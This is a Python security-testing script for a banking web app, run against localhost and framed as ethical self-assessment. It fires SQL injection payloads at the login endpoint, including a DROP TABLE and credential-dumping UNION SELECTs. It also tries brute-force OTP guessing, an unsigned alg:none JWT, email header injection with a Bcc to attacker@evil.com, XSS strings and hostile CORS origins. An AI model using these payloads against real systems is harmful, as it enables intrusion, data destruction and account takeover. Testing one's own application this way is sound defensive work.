#!/usr/bin/env python3
"""
Security Assessment Tool for Quantum Banking App
This tool performs ethical hacking tests on YOUR OWN application
Use only on applications you own and have permission to test
"""

import requests
import json
import time
import hashlib
import itertools
import threading
from datetime import datetime
import re

class BankingSecurityTester:
    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities = []
        
    def log_vulnerability(self, severity, test_name, description, exploit_data=None):
        """Log discovered vulnerabilities"""
        vuln = {
            'timestamp': datetime.now().isoformat(),
            'severity': severity,
            'test': test_name,
            'description': description,
            'exploit_data': exploit_data
        }
        self.vulnerabilities.append(vuln)
        print(f"[{severity}] {test_name}: {description}")
        
    def test_sql_injection_advanced(self):
        """Advanced SQL injection testing"""
        print("\n🔍 Testing SQL Injection Vulnerabilities...")
        
        # Common SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT username,password FROM users--",
            "'; DROP TABLE users; --",
            "' OR 1=1 LIMIT 1--",
            "admin'--",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "' OR 1=1#",
            "' AND 1=0 UNION SELECT NULL,username,password FROM users--"
        ]
        
        # Test login endpoint
        for payload in sql_payloads:
            try:
                data = {
                    "account_number": payload,
                    "password": "test123"
                }
                response = self.session.post(f"{self.base_url}/api/auth/login", 
                                           json=data, timeout=5)
                
                if response.status_code == 200:
                    self.log_vulnerability("CRITICAL", "SQL Injection", 
                                         f"SQL injection successful with payload: {payload}",
                                         {"payload": payload, "response": response.text})
                elif "error" in response.text.lower() and "sql" in response.text.lower():
                    self.log_vulnerability("HIGH", "SQL Error Disclosure", 
                                         f"Database error exposed with payload: {payload}")
                    
            except Exception as e:
                pass
                
    def test_otp_brute_force(self):
        """Test OTP brute force vulnerability"""
        print("\n🔍 Testing OTP Brute Force Protection...")
        
        # First, try to get a valid session
        login_data = {
            "account_number": "1234567890",
            "password": "password123"
        }
        
        try:
            response = self.session.post(f"{self.base_url}/api/auth/login", json=login_data)
            
            if response.status_code == 200:
                print("📧 OTP sent to email, testing brute force...")
                
                # Try common OTP patterns
                common_otps = ['123456', '000000', '111111', '123123', '654321']
                
                for otp in common_otps:
                    verify_data = {
                        "account_number": "1234567890",
                        "otp": otp
                    }
                    
                    otp_response = self.session.post(f"{self.base_url}/api/auth/verify-otp", 
                                                   json=verify_data)
                    
                    if otp_response.status_code == 200:
                        self.log_vulnerability("CRITICAL", "OTP Brute Force", 
                                             f"OTP cracked: {otp}",
                                             {"cracked_otp": otp})
                        return
                        
                # Test rate limiting
                self.test_rate_limiting()
                        
        except Exception as e:
            print(f"Login test failed: {e}")
            
    def test_rate_limiting(self):
        """Test rate limiting on OTP requests"""
        print("\n🔍 Testing Rate Limiting...")
        
        login_data = {
            "account_number": "1234567890", 
            "password": "password123"
        }
        
        successful_requests = 0
        for i in range(10):  # Try 10 rapid requests
            try:
                response = self.session.post(f"{self.base_url}/api/auth/login", json=login_data)
                if response.status_code == 200:
                    successful_requests += 1
                time.sleep(0.1)  # Small delay
            except:
                pass
                
        if successful_requests > 5:
            self.log_vulnerability("MEDIUM", "Rate Limiting Bypass", 
                                 f"Sent {successful_requests} OTP requests without blocking")
                                 
    def test_jwt_vulnerabilities(self):
        """Test JWT token vulnerabilities"""
        print("\n🔍 Testing JWT Security...")
        
        # Try to get a valid JWT first
        login_data = {"account_number": "1234567890", "password": "password123"}
        
        try:
            login_response = self.session.post(f"{self.base_url}/api/auth/login", json=login_data)
            
            # Simulate getting OTP (you'd need actual OTP from email)
            # This is just for testing JWT structure
            
            # Test common JWT attacks
            jwt_attacks = [
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
                "null",
                "",
                "Bearer " + "A" * 500  # Very long token
            ]
            
            for token in jwt_attacks:
                headers = {"Authorization": f"Bearer {token}"}
                try:
                    response = self.session.get(f"{self.base_url}/api/dashboard/user", 
                                              headers=headers)
                    if response.status_code == 200:
                        self.log_vulnerability("HIGH", "JWT Bypass", 
                                             f"JWT validation bypassed with: {token[:50]}...")
                except:
                    pass
                    
        except Exception as e:
            print(f"JWT test setup failed: {e}")
            
    def test_email_header_injection(self):
        """Test email header injection in registration"""
        print("\n🔍 Testing Email Header Injection...")
        
        malicious_emails = [
            "test@example.com\nBcc: attacker@evil.com",
            "test@example.com\r\nSubject: Hacked\r\n",
            "test@example.com%0aBcc:attacker@evil.com",
            "test@example.com\nContent-Type: text/html\n<script>alert('xss')</script>"
        ]
        
        for email in malicious_emails:
            try:
                register_data = {
                    "name": "Test User",
                    "email": email,
                    "password": "password123"
                }
                
                response = self.session.post(f"{self.base_url}/api/auth/register", 
                                           json=register_data)
                
                if response.status_code == 200:
                    self.log_vulnerability("MEDIUM", "Email Header Injection", 
                                         f"Malicious email accepted: {email}")
                                         
            except Exception as e:
                pass
                
    def test_account_enumeration(self):
        """Test account number enumeration"""
        print("\n🔍 Testing Account Enumeration...")
        
        # Test different responses for valid vs invalid accounts
        test_accounts = ["1234567890", "0000000000", "9999999999", "1111111111"]
        responses = {}
        
        for account in test_accounts:
            try:
                data = {"account_number": account, "password": "wrongpassword"}
                response = self.session.post(f"{self.base_url}/api/auth/login", json=data)
                
                responses[account] = {
                    'status': response.status_code,
                    'response_time': response.elapsed.total_seconds(),
                    'message': response.text
                }
                
            except Exception as e:
                pass
                
        # Analyze responses for differences
        response_times = [r['response_time'] for r in responses.values()]
        if max(response_times) - min(response_times) > 0.5:
            self.log_vulnerability("MEDIUM", "Account Enumeration", 
                                 "Different response times may reveal valid accounts")
                                 
    def test_xss_vulnerabilities(self):
        """Test Cross-Site Scripting vulnerabilities"""
        print("\n🔍 Testing XSS Vulnerabilities...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>"
        ]
        
        for payload in xss_payloads:
            try:
                data = {
                    "name": payload,
                    "email": "test@example.com",
                    "password": "password123"
                }
                
                response = self.session.post(f"{self.base_url}/api/auth/register", 
                                           json=data)
                
                if payload in response.text and response.status_code == 200:
                    self.log_vulnerability("HIGH", "XSS Vulnerability", 
                                         f"XSS payload reflected: {payload}")
                                         
            except Exception as e:
                pass
                
    def test_cors_misconfiguration(self):
        """Test CORS misconfiguration"""
        print("\n🔍 Testing CORS Configuration...")
        
        malicious_origins = [
            "http://evil.com",
            "https://attacker.com",
            "null",
            "*"
        ]
        
        for origin in malicious_origins:
            try:
                headers = {"Origin": origin}
                response = self.session.options(f"{self.base_url}/api/auth/login", 
                                              headers=headers)
                
                cors_header = response.headers.get('Access-Control-Allow-Origin')
                if cors_header == origin or cors_header == "*":
                    self.log_vulnerability("MEDIUM", "CORS Misconfiguration", 
                                         f"Dangerous CORS policy allows: {origin}")
                                         
            except Exception as e:
                pass
                
    def run_comprehensive_test(self):
        """Run all security tests"""
        print("🚀 Starting Comprehensive Security Assessment")
        print("=" * 60)
        
        self.test_sql_injection_advanced()
        self.test_otp_brute_force()
        self.test_jwt_vulnerabilities()
        self.test_email_header_injection()
        self.test_account_enumeration()
        self.test_xss_vulnerabilities()
        self.test_cors_misconfiguration()
        
        self.generate_report()
        
    def generate_report(self):
        """Generate security assessment report"""
        print("\n" + "=" * 60)
        print("🛡️  SECURITY ASSESSMENT REPORT")
        print("=" * 60)
        
        if not self.vulnerabilities:
            print("✅ No vulnerabilities found! Your application appears secure.")
        else:
            print(f"⚠️  Found {len(self.vulnerabilities)} potential issues:")
            
            for vuln in self.vulnerabilities:
                print(f"\n[{vuln['severity']}] {vuln['test']}")
                print(f"Description: {vuln['description']}")
                if vuln['exploit_data']:
                    print(f"Exploit Data: {vuln['exploit_data']}")
                    
        print("\n📋 RECOMMENDATIONS:")
        print("1. Always use parameterized queries")
        print("2. Implement proper rate limiting")
        print("3. Validate and sanitize all inputs")
        print("4. Use strong JWT secrets and validation")
        print("5. Implement proper CORS policies")
        print("6. Regular security testing and code reviews")
        
        # Save report to file
        with open('security_report.json', 'w') as f:
            json.dump(self.vulnerabilities, f, indent=2)
        print("\n💾 Detailed report saved to: security_report.json")

if __name__ == "__main__":
    print("⚠️  ETHICAL HACKING TOOL - USE ONLY ON YOUR OWN APPLICATIONS")
    print("This tool is for testing YOUR banking application security")
    
    tester = BankingSecurityTester()
    tester.run_comprehensive_test()